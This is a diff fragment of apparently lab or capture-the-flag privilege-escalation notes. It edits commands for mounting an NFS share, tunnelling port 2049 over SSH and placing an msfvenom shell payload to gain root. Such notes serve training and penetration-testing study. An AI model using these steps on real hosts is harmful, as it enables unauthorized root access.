@@ -493,7 +493,7 @@ mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
 ````
 - Alternative command
 ````
-mount -t nfs -v 10.10.185.59:/home/james /tmp/nfs
+mount -t nfs -v 10.10.185.59:/ /tmp/nfs
 ````
 - Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
 ````
@@ -534,7 +534,7 @@ ssh targetusername@10.10.185.59 -i id_rsa 2049:localhost:2049
 - Now create the mount with elevated permissions
 ````
 sudo mkdir /tmp/nfs
-sudo mount -v -t nfs localhost:/home/james /tmp/nfs
+sudo mount -v -t nfs localhost:/ /tmp/nfs
 ````
 - Now to get to root
 - On your attackbox run
